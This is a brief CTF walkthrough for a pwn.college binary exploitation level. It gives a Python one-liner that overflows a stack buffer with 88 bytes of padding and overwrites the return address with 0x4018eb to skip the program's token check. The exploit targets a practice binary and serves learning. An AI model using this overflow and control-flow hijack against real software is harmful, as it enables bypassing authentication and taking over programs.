# Stage 11: Tricky Control Hijack (Easy) — CTF Walkthrough

## Module Metadata

| Field | Value |
|-------|-------|
| **Module Name** | Pwn.College — Binary Exploitation |
| **Level** | Easy |
| **Estimated Time** | — |
| **Category** | Binary Exploitation / Reversing |
| **Platform** | Linux x86-64 |
| **Binary** | `binary-exploitation-control-hijack-2-w` |
| **VT Score** | N/A |

---

## Challenge

`/challenge/binary-exploitation-control-hijack-2-w`. The trickier variant: 88 bytes of `A` padding followed by the 8-byte little-endian address `0x4018eb` — per the original solution's comment, the address after the token check.

## Solution

```bash
python3 -c "
import struct
import sys
offset = 88
target = 0x4018eb  # Address after token check
payload = b'A' * offset + struct.pack('<Q', target)
sys.stdout.buffer.write(payload)
" | /challenge/binary-exploitation-control-hijack-2-w
```
